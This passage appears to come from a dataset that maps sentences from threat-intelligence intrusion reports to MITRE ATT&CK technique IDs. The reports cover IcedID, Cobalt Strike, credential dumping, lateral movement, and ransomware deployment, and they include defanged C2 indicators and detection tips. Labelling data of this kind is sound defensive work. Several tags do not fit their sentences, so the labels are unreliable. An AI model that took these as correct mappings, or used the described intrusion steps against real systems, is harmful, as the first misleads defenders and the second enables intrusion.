    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "And again in 4778 followed by 4779 on the domain controller:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During the RDP session, 1.dll (Cobalt Strike DLL) was transferred from the beachhead via the Windows File Explorer.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Similarly, the final files used to execute the ransomware deployment were transferred in the same manner, which can be seen via the file creation logging process being Explorer.EXE.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once both k.exe and p.bat were copied to the machines in the network, the threat actor used PsExec.exe to remotely create a service named mstdc to run p.bat (p.bat runs k.exe, which encrypts the system based on the Base64 encoded config) via System account.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Once entails.exe (rundll32.exe) successfully executed templates544.png on the beachhead host, an outbound connection was established talking to trentonkaizerfak[.]com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This downloaded a gzip file for the next IcedID stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After executing this payload, command and control was established to 5.255.103[.]16",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After the injection into cmd.exe on the beachhead host, 1.dll (Cobalt Strike DLL) was created, which later was transferred to the domain controller.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Then, 1.dll was executed on the domain controller via rundll32.exe and after execution, rundll32.exe connected to the command and control server 5.8.18[.]242.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was seen deploying Nokoyawa ransomware throughout the environment utilizing both PSExec & WMIC.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "In June, we saw another threat actor utilize IcedID to download Cobalt Strike, which was used to pivot to other systems in the environment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Eleven days later, activity returned to the environment with more Cobalt Strike beacons, which they used to pivot throughout the domain using WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Our intrusion starts when a malicious Word document is executed that drops and executes an HTA file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This HTA file is used to download IcedID in the form of a JPG file.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "IcedID downloads some 2nd stage payloads and loads the DLL into memory with rundll32 (miubeptk2.dll – IcedID – used for persistence) and regsvr32 (ekix4.dll – Cobalt Strike beacon – privilege escalation via fodhelper) to pillage the domain.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "WMIC was utilized to launch ProcDump in an attempt to dump lsass.exe.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "WMIC was also used to perform discovery of endpoint security software.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A flurry of other programs were used to perform discovery within the environment including nltest.exe, adfind.exe via adf.bat, and net.exe.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Command and Control was achieved via IcedID and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "There were numerous attempts at lateral movement via Cobalt Strike beacons, with limited success.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "While command and control never left, activity–other than beaconing, ceased.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On day eleven, a new Cobalt Strike infrastructure was introduced to the environment with the threat actor displaying new techniques that were successful in moving laterally, where the initial activity failed.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Two of the Cobalt Strike servers used in this intrusion were added to our Threat Feed on 6/3/21 and the other one was added on 6/14/21",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The attachment was a Microsoft Word document that drops a malicious HTA file “textboxNameNamespace.hta”.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Analysis of the encoded HTA file revealed that a file named textboxNameNamespace.jpg was downloaded from http://povertyboring2020b[.]com.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The HTA file when executed downloads a file named “textboxNameNamespace.jpg”, which is actually an IcedID DLL file responsible for the first stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Persistence\nIcedID establishes persistence on the compromised host using a scheduled task named ‘{0AC9D96E-050C-56DB-87FA-955301D93AB5}’ that executes its second stage.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This scheduled task was observed to be executing hourly under the initially compromised user.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "IcedID initially performed some discovery of the local system and the domain.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Later, Cobalt Strike beacons were used to perform discovery of the system and domain.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A discovery batch script that runs ADFind.exe was dropped to the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon itself was used as a proxy to connect and retrieve the PowerView file. Cobalt Strike was injected into the winlogon.exe process and used to perform further discovery.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The following shows the decoded PowerShell commands used by Cobalt Strike to perform discovery.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Just like the previous attempt, a remote service was created, however, this time a DLL payload was used rather than a PowerShell payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A Cobalt Strike DLL was copied to a server and executed using WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Command and Control The logs demonstrate multiple connections from IcedID to their C2 servers, including aws.amazon[.]com for connectivity checks.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacons also make use of multiple C2 servers on the public internet.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In October 2023, we observed an intrusion that began with a spam campaign, distributing a forked IcedID loader.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used Impacket’s wmiexec and RDP to install ScreenConnect on multiple systems, enabling them to execute various commands and deploy Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Their toolkit also included CSharp Streamer, a RAT written in CSharp with numerous functionalities, as documented here.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began in October 2023 with a malicious email that enticed the recipient to download a zip archive containing a Visual Basic Script (VBS) and a benign README file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We assess with high confidence that this email was part of a spam campaign delivering a forked variant of IcedID.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "First reported by ProofPoint in February 2023, this forked IcedID variant lacks banking functionality and prioritizes payload delivery.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon user interaction with the archive’s contents, the VBS file was executed, initiating the embedded forked IcedID loader.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by the creation of a scheduled task to maintain persistence on the beachhead.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The forked IcedID loader then communicated with a command and control server, leading to the dropping and execution of another IcedID DLL.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Approximately two minutes after execution, the first round of discovery was observed using Windows native binaries, mirroring the activity seen in previously reported IcedID cases.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "They also used PowerShell cradles, bitsadmin, and certutil to attempt retrieval of Cobalt Strike beacons on the beachhead.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They had a few stumbles while trying to download the Cobalt Strike beacons using temp.sh, resulting in downloading the HTML of the website rather than their intended payload file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once the Cobalt Strike beacons were executed, they established communication with the Cobalt Strike command and control server.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Within 20 minutes of this activity, a new payload, cslite.exe (CSharp Streamer C2), was dropped on the beachhead.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During this intrusion, it was first used to access the LSASS process on the beachhead for credential access; and around 40 minutes after that, the threat actor performed a dcsync operation from the beachhead host to one of the domain controllers.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then copied a renamed ScreenConnect installer from the beachhead to a domain controller over SMB.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During this session, the threat actor dropped several CSharp Streamer payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They then initiated an RDP connection from the domain controller to a backup server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor reviewed backups and running processes before dropping both a CSharp Streamer binary and a previously used ScreenConnect installer.",
    "command": "",
    "labels": [
      "T1005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These were then executed over the RDP session.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Next, a Cobalt Strike beacon was run, and LSASS was accessed on the host.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Around eleven hours later, the threat actor dropped several Cobalt Strike beacons and attempted to execute them; however, no new command and control traffic was observed.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor quickly removed the files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Four hours later, another ScreenConnect installer was dropped on the backup server and executed using wmiexec.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "A new RDP connection was then initiated to a second domain controller, and netscan was run again.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Following this, ScreenConnect was installed on the second domain controller, and an RDP session was started from this domain controller to a file server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the file server, both a Cobalt Strike beacon and the ScreenConnect installer were dropped and executed via the RDP session.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They dropped and executed a new ScreenConnect installer on the backup server via wmiexec and ran netscan again.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Using RDP, they connected to the file server and used Mozilla Firefox to preview a few financial documents before running netscan there as well.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "We observed the threat actor performing Google searches for the keyword “rclone” and subsequently downloading the rclone application on the file server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On day seven of the intrusion, a RDP connection was initiated from the beachhead to the backup and the file server using CSharp Streamer.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "New ScreenConnect installers appear yet again and followed the same WMI execution pattern as before.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "From the backup server, they ran a fresh netscan sweep and began staging both a ScreenConnect installer and an ALPHV ransomware binary.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "First, they used xcopy to stage the ScreenConnect installer across all Windows hosts in the domain and then executed it using a WMI command.",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This was then repeated for the ALPHV ransomware payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once the ZIP file was extracted the user was presented with a Readme and a Visual Basic Script (VBS) file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "WScript.exe was called when executing the script, which starts the infection.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The script embeds a DLL in a slightly obfuscated form and base64 encodes it, saves it in C:\\Windows\\Temp\\0370-1.dll and then executes said DLL through regsvr32.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This DLL is an IcedID loader as observed with sandboxing here.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The infection chain was concluded by the loader dropping and executing another IcedID DLL via rundll32.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once IcedID was operational, the threat actor used it to install the RMM tool ScreenConnect, renamed as toovey.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Besides execution with wmiexec.py, some installers were executed during the threat actor RDP sessions:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "As in most intrusions we document, Cobalt Strike beacons were used in this intrusion.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "On the beachhead host, using ScreenConnect, the threat actor tried to download malicious Cobalt Strike beacons using bitsadmin, without success.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Besides process creation event logs, bitsadmin downloads can also be detected via event ID 59 and 60 of “Microsoft-Windows-Bits-Client/Operational” log.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Following this failure, they used another LOLBin named certutil to download their payloads, again via ScreenConnect.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This behavior was repeated to download other Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell was another tool used to retrieve Cobalt Strike beacons, again with some failures, and yet again using ScreenConnect.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In addition to the previously mentioned methods of retrieving additional payloads, there was another instance where the attackers used temp.sh to host their malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On another occasion, PowerShell usage was successful, and in those cases using Sysmon’s events we can trace child processes from PowerShell ParentCommandLine.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "For instance, the following display shows a payload used to launch https64.dll, another Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Because the beacon was using plain HTTP, the retrieved PowerShell payload can be extracted from the network communications.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As part of their toolkit, the threat actor used Impacket’s wmiexec.py script to perform actions.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This activity can be easily observed in logs because of the default redirect of its output to \\\\127.0.0.1\\ADMIN$\\__%timestamp% (as visible in the source code).",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actor deployed a binary named “cslite.exe” on the beachhead host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When executed, the tool writes a .NET executable to the %USERPROFILE%\\AppData\\Local\\Temp folder using a .tmp extension and then loads it into memory, as seen in the Sysmon Event ID 7 event:",
    "command": "",
    "labels": [
      "T1055",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Using dynamic analysis from running the sample in a malware analysis sandbox, we can observe the injected .NET assemblies:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "IcedID registered a scheduled task for persistence, in the same manner as documented in several other reports.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The task was registered to be executed every hour after logon as indicated respectively by the following XML tags:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Upon installation, ScreenConnect persists across reboots with an auto-start service.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Should the System event logs be unavailable (for instance if cleared by an threat actor), the service configuration is saved inside the SYSTEM registry file, which can be analyzed using Eric Zimmerman’s Registry Explorer tool, in the HKLM\\CurrentControlSet\\Services\\ location.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Upon moving laterally to a backup server, we observed Cobalt Strike injection into legitimate process “winlogon.exe” and “rundll32.exe”.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Here, by processing the acquired memory with MemprocFS and using the findevil command, we can find an injected beacon in winlogon.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actor deleted the renamed ScreenConnect installers from the backup server and the file server using the “del” command, in an attempt to cover their tracks.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Credentials were extracted from LSASS (Local Security Authority Subsystem), a technique commonly seen during similar intrusions.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "On day one, through hands-on activity, the threat actor executed cslite.exe (a CSharp Streamer file dropped on the Desktop of a compromised user), which was used to access the LSASS process.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "0x1010: PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and PROCESS_VM_READ (0x0010)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "0x1FFFFF: PROCESS_ALL_ACCESS",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Another data point to look for is the UNKNOWN string in the CallTrace, which indicates Sysmon was not able to resolve the address of code from where the OpenProcess function was called, potential indication of a DLL in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We also were able to collect memory and scan it with various YARA rules, confirming the use of a Mimikatz implementation with several rule hits for the cslite.exe memory space and file:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In another instance, we saw LSASS being accessed by WerFault.exe, with PROCESS_ALL_ACCESS granted.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This should happen rarely in a production environment, and once again, the CallTrace can also help as CallTrace with ntdll.dll, dbghelp.dll or dbgcore.dll (source 1, source 2) should be monitored.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Finally, on the second day, we can see yet another access to LSASS, this time from rundll32.exe, once again using access 0x1010 and with UNKNOWN in the CallTrace.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This time, rundll32.exe was spawned by PowerShell, which was tasked to download and execute a Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Around 40 minutes after the LSASS dump by the “cslite.exe” executable, we observed a traffic spike from the beachhead host to a domain controller.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Minutes after the initial compromise, a first round of discovery was observed using native Windows built-in utilities, spawning from the IcedID malware.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "As explained in the execution section, the installer was also executed via Impacket’s wmiexec.py script, which resulted in the ScreenConnect installation.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "RDP was used extensively during the intrusion by the threat actor to move laterally.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "While the threat actor most frequently used the native Windows RDP clients, on at least one occasion they proxied their RDP session via the CSharp Streamer.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This tool was used to aggregate, stage, and compress sensitive data files, using LDAP and creating multiple ZIP archives.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Once the LDAP query is complete, the tool enumerates shared folders, filtering out some uninteresting folders such as NETLOGON or SYSVOL.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On each selected folder, the tool will look for files based on keywords (in the screenshot they’re after the words security_reports and finance) before compressing data.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "This automates the collection phase, ensuring swift action across the whole network.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "This can be seen by looking at the process command line, which contains the url argument, as displayed below.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The forked IcedID loader established connection to command and control server modalefastnow[.]com over port 443, which resolved at the time to 212.18.104.12.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The contents of the network connection matched a malware rule in the Emerging Threats Open ruleset “ET MALWARE Win32/IcedID Request Cookie”.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After the initial infection, the second stage IcedID DLL communicated with the following C2 servers:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The following URIs were accessed for 85.209.11.48:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using MemProcFS to process the memory from the backup server, we were able to extract the minidump for the injected Cobalt Strike process.",
    "command": "",
    "labels": [
      "T1005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Using the minidump, the beacon configuration was able to be parsed using 1768.py:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The “cslite.exe” CSharp Streamer executable communicated to the IP address 109.236.80.191.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, we observed traffic to it across various ports, including 135, 139, 80, 443, and 3389.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Most traffic was observed at 443 and 3389.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Looking at the memory of the “cslite.exe” run in a sandbox, we can extract the configured communication preferences for the trojan:",
    "command": "",
    "labels": [
      "T1005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Later, ScreenConnect was installed on multiple systems by dropping renamed installer and executing it through Impacket’s wmiexec.py script.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "While Firefox was used to preview documents, it was also used to download Rclone.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Rclone was dropped on the file server.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "This can be detected by looking at file creation, for instance using the event ID 11 from Sysmon.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Rclone was not directly started, but was launched though a VBS script named nocmd.vbs, which itself executes rcl.bat, which in turn executes Rclone.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Before that, the threat actor used the config Rclone command, which performs the following action according to the documentation:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "enter an interactive configuration session where you can setup new remotes and manage existing ones",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This started with the threat actor staging two files on the backup server.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "“setup.exe,” which was dropped twice, was just the latest ScreenConnect installer the adversary employed during the intrusion.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "First, they used the xcopy Windows utility to move the ScreenConnect installer across the domain in the root of C$:",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Second, they remotely ran the installer on hosts using WMI commands:",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Third, they repeated the process, copying the ransomware payload from the backup server to the domain joined hosts in the network.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Finally, they used this same method to execute the ransomware remotely via WMI:",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "On the remote hosts, the “WMIPrvSE.exe” was observed executing the task.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors have moved to other means of initial access, such as ISO files combined with LNKs or OneNote payloads, but some appearances of VBA macros in Office documents can still be seen in use.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "In this case we document an incident taking place during Q4 of 2022 consisting of threat actors targeting Italian organizations with Excel maldocs that deploy IcedID.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors deploying such a campaign may hope to target organizations who have not updated their Microsoft Office deployments after the newly released patches to block macros on documents downloaded from the internet.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We have previously reported on IcedID intrusions that have migrated to ISO files, however, this report is one of the most recent that will focus on the traditional Excel/macro intrusion vector.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once inside, the threat actors pivoted using Cobalt Strike and RDP before a domain wide deployment of Nokoyawa ransomware with the help of PsExec.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began with a malicious Excel document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon opening the Excel document, the macros would be executed when a user clicked on an embedded image.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The macro code was responsible for downloading and writing an IcedID DLL payload to disk.",
    "command": "",
    "labels": [
      "T1074.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The macro then used a renamed rundll32 binary to execute the malicious DLL.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "After reaching out to the initial command and control server, automated discovery ran from the IcedID process around two minutes after execution.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "At this time, the malware also established persistence on the beachhead host using a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Around two hours after the initial malware ran, IcedID loaded several Cobalt Strike beacons on the beachhead.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Within minutes of running Cobalt Strike on the beachhead the threat actors proceeded to elevate to SYSTEM permissions and dump LSASS memory using the beacons.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Next, discovery tasks continued from the beachhead host, including network scans for port 1433 (MSSQL) and browsing network shares with an interest in password files.",
    "command": "",
    "labels": [
      "T1033",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors appeared to have removed some contents of the network shares off the network as canary files report the documents being opened off network minutes later.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Privilege escalation was also observed on the system via named pipe impersonation.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Early on the sixth day, the threat actors became active again launching the Edge browser on the beachhead host and appeared to download a file from dropmefiles[.]com.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Then, from the beachhead host, a new process was spawned from the IcedID malware; and from this shell, the threat actors began enumerating Active Directory using adget and AdFind.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "More credential dumping was observed, followed by additional AdFind and other Windows discovery commands.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then continued lateral movement and began checking RDP access across the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
